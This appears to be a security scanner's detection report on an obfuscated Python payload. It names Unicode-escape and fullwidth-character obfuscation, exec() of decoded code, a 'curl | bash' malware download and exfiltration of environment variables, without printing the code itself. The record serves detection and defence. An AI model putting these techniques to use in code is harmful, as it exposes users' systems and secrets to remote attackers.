primary_detection.name: Unicode Escape Sequence Obfuscation
primary_detection.description: Detected Unicode escape sequences used to hide malicious code execution

underlying_threats.name: Remote Code Execution
underlying_threats.description: exec() used to execute Unicode-decoded malicious payload

underlying_threats.name: Malware Download
underlying_threats.description: Downloads malware from remote server via curl | bash

underlying_threats.name: Environment Variable Exfiltration
underlying_threats.description: Exports environment variables to external server

obfuscation_technique.decode_method: Python string literal interpretation or unicodedata.normalize()

reasoning: Unicode escape sequences used to obfuscate malware download commands. Multiple Unicode encoding variants detected including standard \uXXXX escapes and fullwidth character substitution, all resolving to remote code execution payloads.
